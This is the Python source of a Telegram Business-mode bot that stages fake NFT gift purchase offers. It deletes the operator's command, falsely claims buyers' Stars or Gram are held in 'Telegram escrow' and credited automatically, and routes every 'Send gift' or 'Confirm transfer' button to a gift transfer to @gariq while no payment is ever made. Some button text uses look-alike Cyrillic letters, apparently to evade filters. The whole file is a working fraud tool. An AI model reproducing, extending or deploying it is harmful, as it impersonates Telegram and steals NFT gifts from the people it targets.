import asyncio
import logging
import os
import re
import uuid
from datetime import datetime, timedelta

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# --- ЗАГРУЗКА ПЕРЕМЕННЫХ ИЗ .env ---
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=gariq")
RECIPIENT_USERNAME = os.getenv("RECIPIENT_USERNAME", "@gariq")
STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5920433463428650761")
GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5778546023349621090")
CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не найден в .env файле!")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers = {}


# --- БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ ---
async def safe_edit(message: types.Message, text: str, reply_markup=None, business_connection_id=None):
    if message is None:
        return
    try:
        if business_connection_id:
            await bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=text,
                reply_markup=reply_markup,
                disable_web_page_preview=True,
                parse_mode="HTML",
                business_connection_id=business_connection_id
            )
        else:
            await message.edit_text(
                text=text,
                reply_markup=reply_markup,
                disable_web_page_preview=True,
                parse_mode="HTML"
            )
    except TelegramBadRequest as e:
        if "message is not modified" in str(e).lower():
            pass
        else:
            print(f"[EDIT ERROR] {e}")
    except Exception as e:
        print(f"[EDIT UNKNOWN ERROR] {e}")


# --- УТИЛИТЫ ПРЕМИУМ-ЭМОДЗИ ---
def star_emoji() -> str:
    return f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'


def gram_emoji() -> str:
    return f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'


def check_emoji() -> str:
    return f'<tg-emoji emoji-id="{CHECK_EMOJI_ID}">✔️</tg-emoji>'


def cross_emoji() -> str:
    return f'<tg-emoji emoji-id="{CROSS_EMOJI_ID}">❌</tg-emoji>'


def currency_display(amount: str, currency: str, lang: str) -> str:
    c = (currency or "").strip().lower()
    if c == "gram":
        label = "克" if lang == "ch" else "gram"
        return f"{amount} {gram_emoji()} {label}"
    return f"{amount} {star_emoji()}"


def pretty_nft_name(nft_url: str) -> str:
    raw = nft_url.rstrip("/").split("/")[-1]
    if "-" in raw:
        name_part, num_part = raw.rsplit("-", 1)
        name_part = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_part)
        return f"{name_part} #{num_part}"
    return raw


# --- ТАЙМЕР ---
def format_time_left(expires_at: datetime, lang: str) -> str:
    now = datetime.now()
    delta = expires_at - now
    total_sec = int(delta.total_seconds())

    if total_sec <= 0:
        if lang == "ru":
            return "Предложение истекло"
        if lang == "us":
            return "Offer expired"
        if lang == "ch":
            return "提议已过期"
        if lang == "uk":
            return "Пропозиція закінчилась"
        return "Expired"

    hours = total_sec // 3600
    minutes = (total_sec % 3600) // 60

    if lang == "ru":
        return f"Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
    if lang == "us":
        return f"Offer valid for <b>{hours} h. {minutes} min.</b>"
    if lang == "ch":
        return f"提议有效期还剩 <b>{hours} 小时 {minutes} 分钟</b>"
    if lang == "uk":
        return f"Пропозиція дійсна ще <b>{hours} год. {minutes} хв.</b>"
    return f"Offer valid for <b>{hours} h. {minutes} min.</b>"


# --- ЛОКАЛИЗАЦИЯ ---
TEXTS = {
    "ru": {
        "offer_title": "Пользователь Предлагает Bам",
        "offer_for": "3а подарок",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать подарок",
        "btn_confirm": "Подтвердить передачу",
        "deal_title": "Сделка с NFT",
        "deal_order": "3аказ",
        "deal_reserved": "Покупатель зарезервировал",
        "deal_via_stars": "средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
        "deal_footer_stars": "Платформа зафиксирует сделку и моментально зачислит",
        "deal_footer2_stars": "на ваш баланс. Резерв действует 24 часа.",
        "deal_via_gram": "средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
        "deal_footer_gram": "Платформа зафиксирует сделку и моментально зачислит",
        "deal_footer2_gram": "на ваш баланс. Резерв действует 24 часа.",
        "deal_instr_title": "Инструкция для завершения сделки:",
        "deal_step2": "Нажмите «Передать подарок» и выберите",
        "deal_step3": "Подтвердите передачу подарка.",
        "declined": "Вы отклонили предложение.",
        "confirm_title": "Пожалуйста, завершите передачу NFT, нажав на кнопку ниже.",
        "confirm_footer": "После передачи подарка средства будут зачислены автоматически.",
    },
    "us": {
        "offer_title": "User offers you",
        "offer_for": "for gift",
        "btn_accept": "Аccept",
        "btn_decline": "Decline",
        "btn_transfer": "Send gift",
        "btn_confirm": "Confirm trаnsfer",
        "deal_title": "NFT Deal",
        "deal_order": "Order",
        "deal_reserved": "Buyer has reserved",
        "deal_via_stars": "via Telegram escrow. Stars are held on a special account and will be automatically credited to your Telegram Stars balance right after the gift is transferred.",
        "deal_footer_stars": "Telegram will record the transaction and instantly credit",
        "deal_footer2_stars": "to your balance. Reservation is valid for 24 hours.",
        "deal_via_gram": "via Telegram escrow. Gram are held on a special account and will be automatically credited to your balance right after the gift is transferred.",
        "deal_footer_gram": "Telegram will record the transaction and instantly credit",
        "deal_footer2_gram": "to your balance. Reservation is valid for 24 hours.",
        "deal_instr_title": "Instructions to complete the deal:",
        "deal_step2": "Press «Send gift» and select",
        "deal_step3": "Confirm the gift transfer.",
        "declined": "You have declined the offer.",
        "confirm_title": "Please complete the NFT transfer by pressing the button below.",
        "confirm_footer": "After the gift is transferred, funds will be credited automatically.",
    },
    "ch": {
        "offer_title": "用户向您提议",
        "offer_for": "换取礼物",
        "btn_accept": "接受",
        "btn_decline": "拒绝",
        "btn_transfer": "赠送礼物",
        "btn_confirm": "确认转账",
        "deal_title": "NFT 交易",
        "deal_order": "订单",
        "deal_reserved": "买家已预留",
        "deal_via_stars": "通过 Telegram 担保系统。星星将保存在特殊托管账户中，并在礼物转账后立即自动记入您的 Telegram Stars 余额。",
        "deal_footer_stars": "Telegram 将记录交易并立即记入",
        "deal_footer2_stars": "到您的余额。预留有效期为 24 小时。",
        "deal_via_gram": "通过 Telegram 担保系统。克将保存在特殊托管账户中，并在礼物转账后立即自动记入您的余额。",
        "deal_footer_gram": "Telegram 将记录交易并立即记入",
        "deal_footer2_gram": "到您的余额。预留有效期为 24 小时。",
        "deal_instr_title": "完成交易的说明：",
        "deal_step2": "点击 «赠送礼物» 并选择",
        "deal_step3": "确认礼物转账。",
        "declined": "您已拒绝该提议。",
        "confirm_title": "请点击下方按钮完成 NFT 转账。",
        "confirm_footer": "礼物转账后，款项将自动记入。",
    },
    "uk": {
        "offer_title": "Користувач пропонує Вам",
        "offer_for": "за подарунок",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати подарунок",
        "btn_confirm": "Підтвердити передачу",
        "deal_title": "Угода з NFT",
        "deal_order": "Замовлення",
        "deal_reserved": "Покупець зарезервував",
        "deal_via_stars": "через гарантійну систему Telegram. Зірки зберігаються на спеціальному рахунку утримання та будуть автоматично зараховані на ваш баланс Telegram Stars відразу після передачі подарунка.",
        "deal_footer_stars": "Система Telegram зафіксує транзакцію та миттєво зарахує",
        "deal_footer2_stars": "на ваш баланс. Резерв діє 24 години.",
        "deal_via_gram": "через гарантійну систему Telegram. Gram зберігаються на спеціальному рахунку утримання та будуть автоматично зараховані на ваш баланс відразу після передачі подарунка.",
        "deal_footer_gram": "Система Telegram зафіксує транзакцію та миттєво зарахує",
        "deal_footer2_gram": "на ваш баланс. Резерв діє 24 години.",
        "deal_instr_title": "Інструкція для завершення угоди:",
        "deal_step2": "Натисніть «Передати подарунок» і виберіть",
        "deal_step3": "Підтвердіть передачу подарунка.",
        "declined": "Ви відхилили пропозицію.",
        "confirm_title": "Будь ласка, завершіть передачу NFT, натиснувши кнопку нижче.",
        "confirm_footer": "Після передачі подарунка кошти будуть зараховані автоматично.",
    },
}


def get_lang(code: str) -> str:
    if not code:
        return "ru"
    c = code.strip().lower()
    if c in TEXTS:
        return c
    return "ru"


def deal_via_text(t: dict, currency: str) -> str:
    if (currency or "").strip().lower() == "gram":
        return t["deal_via_gram"]
    return t["deal_via_stars"]


def deal_footer_text(t: dict, currency: str) -> str:
    if (currency or "").strip().lower() == "gram":
        return t["deal_footer_gram"]
    return t["deal_footer_stars"]


def deal_footer2_text(t: dict, currency: str) -> str:
    if (currency or "").strip().lower() == "gram":
        return t["deal_footer2_gram"]
    return t["deal_footer2_stars"]


# --- КЛАВИАТУРЫ ---
def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_accept"],
                callback_data=f"accept_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=t["btn_decline"],
                callback_data=f"decline_{order_id}",
                icon_custom_emoji_id=CROSS_EMOJI_ID
            ),
        ]
    ])


def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_transfer"],
                url=NFT_TRANSFER_LINK
            )
        ],
        [
            InlineKeyboardButton(
                text=t["btn_confirm"],
                callback_data=f"confirm_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


def get_final_transfer_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_confirm"],
                url=NFT_TRANSFER_LINK,
                icon_custom_emoji_id=CHECK_EMOJI_ID
            )
        ]
    ])


# --- АВТООБНОВЛЕНИЕ ТАЙМЕРА ---
async def update_timer_loop(order_id: str):
    while True:
        await asyncio.sleep(60)

        offer = offers.get(order_id)
        if not offer:
            return

        if offer.get("status") != "pending":
            return

        if datetime.now() >= offer["expires_at"]:
            print(f"[TIMER] offer {order_id} expired")
            return

        lang = offer["lang"]
        t = TEXTS[lang]
        money_str = currency_display(offer["amount"], offer["currency"], lang)
        time_left = format_time_left(offer["expires_at"], lang)

        text = (
            f"<b>{t['offer_title']}</b>\n\n"
            f"{money_str} {t['offer_for']} "
            f"<b>{offer['nft_name']}</b>.\n\n"
            f"{time_left}"
        )

        try:
            await bot.edit_message_text(
                chat_id=offer["chat_id"],
                message_id=offer["message_id"],
                text=text,
                reply_markup=get_offer_keyboard(order_id, lang),
                disable_web_page_preview=True,
                parse_mode="HTML",
                business_connection_id=offer["business_connection_id"]
            )
            print(f"[TIMER] updated {order_id}")
        except TelegramBadRequest as e:
            if "message is not modified" in str(e).lower():
                pass
            else:
                print(f"[TIMER ERROR] {e}")
                return
        except Exception as e:
            print(f"[TIMER UNKNOWN] {e}")
            return


# --- КОМАНДА buy (без точки) ---
@dp.business_message(F.text.lower().startswith("buy "))
async def cmd_buy_business(message: types.Message):
    args = message.text.split()

    print(f"[ARGS] {args}")

    if len(args) < 3:
        await message.answer(
            "Формат: `buy <ссылка> <кол-во> [валюта] [язык]`\n"
            "Пример: `buy https://t.me/nft/RestlessJar-35843 1 stars ru`\n"
            "Валюта: stars / gram\n"
            "Язык: ru / us / ch / uk"
        )
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception as e:
            print(f"[DELETE ERROR] {e}")
        return

    nft_url = args[1]
    amount = args[2]
    currency = args[3].strip().lower() if len(args) > 3 else "stars"
    lang = get_lang(args[4] if len(args) > 4 else "ru")

    print(f"[PARSED] url={nft_url} | amount={amount} | currency={currency} | lang={lang}")

    nft_name = pretty_nft_name(nft_url)
    t = TEXTS[lang]
    money_str = currency_display(amount, currency, lang)

    order_id = f"TG-{str(uuid.uuid4())[:10].upper()}"
    expires_at = datetime.now() + timedelta(hours=6)

    time_left = format_time_left(expires_at, lang)

    text = (
        f"<b>{t['offer_title']}</b>\n\n"
        f"{money_str} {t['offer_for']} "
        f"<b>{nft_name}</b>.\n\n"
        f"{time_left}"
    )

    sent = await message.answer(
        text=text,
        reply_markup=get_offer_keyboard(order_id, lang),
        disable_web_page_preview=True,
        parse_mode="HTML"
    )

    offers[order_id] = {
        "nft_url": nft_url,
        "nft_name": nft_name,
        "amount": amount,
        "currency": currency,
        "lang": lang,
        "expires_at": expires_at,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
        "chat_id": message.chat.id,
        "message_id": sent.message_id,
    }

    asyncio.create_task(update_timer_loop(order_id))

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"[DELETE ERROR] {e}")


# --- ПРИНЯТЬ ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass

    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    print(f"[ACCEPT] order={order_id} | offer={'FOUND' if offer else 'NOT FOUND'}")

    if not offer:
        return

    offer["status"] = "accepted"
    lang = offer["lang"]
    t = TEXTS[lang]
    money_str = currency_display(offer["amount"], offer["currency"], lang)
    via_text = deal_via_text(t, offer["currency"])
    footer_text = deal_footer_text(t, offer["currency"])
    footer2_text = deal_footer2_text(t, offer["currency"])

    # ✅ Убран 1-й пункт «Передайте пользователю: @gariq»
    text = (
        f"<b>{t['deal_title']}</b>\n\n"
        f"{t['deal_order']} #{order_id}\n\n"
        f"{t['deal_reserved']} <b>{money_str}</b> "
        f"{via_text}\n\n"
        f"<b>{t['deal_instr_title']}</b>\n"
        f"1. {t['deal_step2']} <b>{offer['nft_name']}</b>\n"
        f"2. {t['deal_step3']}\n\n"
        f"{footer_text} "
        f"{money_str} {footer2_text}"
    )

    await safe_edit(
        callback.message,
        text,
        get_deal_keyboard(order_id, lang),
        business_connection_id=offer.get("business_connection_id")
    )


# --- ОТКЛОНИТЬ ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass

    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    print(f"[DECLINE] order={order_id} | offer={'FOUND' if offer else 'NOT FOUND'}")

    if not offer:
        return

    offer["status"] = "declined"
    lang = offer["lang"]
    t = TEXTS[lang]

    await safe_edit(
        callback.message,
        f"<b>{t['deal_order']} #{order_id}</b>\n\n{cross_emoji()} {t['declined']}",
        None,
        business_connection_id=offer.get("business_connection_id")
    )


# --- ПОДТВЕРДИТЬ ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass

    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    print(f"[CONFIRM] order={order_id} | offer={'FOUND' if offer else 'NOT FOUND'}")

    if not offer:
        return

    lang = offer["lang"]
    t = TEXTS[lang]

    await safe_edit(
        callback.message,
        f"<b>{t['deal_order']} #{order_id}</b>\n\n{t['confirm_title']}\n\n{t['confirm_footer']}",
        get_final_transfer_keyboard(lang),
        business_connection_id=offer.get("business_connection_id")
    )


# --- DEBUG ---
@dp.business_message()
async def debug_business(message: types.Message):
    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")


async def main():
    print("Бот запущен (Business Mode)...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())